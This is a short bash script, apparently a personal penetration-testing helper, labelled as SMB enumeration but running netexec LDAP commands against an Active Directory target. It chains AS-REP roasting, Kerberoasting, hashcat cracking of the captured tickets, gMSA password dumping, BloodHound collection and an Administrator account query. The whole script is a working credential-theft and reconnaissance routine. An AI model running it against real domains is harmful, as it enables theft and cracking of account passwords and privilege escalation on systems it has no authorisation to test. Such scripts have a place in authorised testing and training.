#! /bin/bash

# SMB Enumeration using netexec - nxc
# By the will of the Omnissiah

# Check if a target IP was provided
if [ -z "$1" ]; then
  echo "Usage: $0 <target-ip>"
  exit 1
fi

TARGET=$1
USER=$2
PASS=$3

# Check if the target is reachable
echo "[*] Checking if $TARGET is reachable..."
if ! ping -c 1 $TARGET > /dev/null 2>&1; then
  echo "[*] $TARGET is unreachable."
  exit 1
fi

# Check if USER and PASS are provided for credentialed enumeration
if [ -n "$USER" ] && [ -n "$PASS" ]; then
  # Asreproasting - password may not be necessary
  nxc ldap $TARGET -u $USER -p $PASS --asreproast output.txt
  # Get domain SID, i dunno about the -k
  nxc ldap $TARGET -u $USER -p $PASS -k --get-sid
  # kerberoasting - will need password, most likely works for service accounts
  nxc ldap $TARGET -u $USER -p $PASS --kerberoasting output.txt
  # will need to dehash using hashcat
  hashcat -m 13100 output.txt wordlist.txt
  # Get the description of users
  nxc ldap $TARGET -u $USER -p $PASS -M get-desc-users
  
  # Dump gmSA only works if have the rights to do so
  nxc ldap $TARGET -u $USER -p $PASS --gmsa
  
  # getting bloodhound ingestor data
  nxc ldap $TARGET -u $USER -p $PASS --bloodhound --collection All
  # Querying LDAP
  nxc ldap $TARGET -u $USER -p $PASS --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
fi
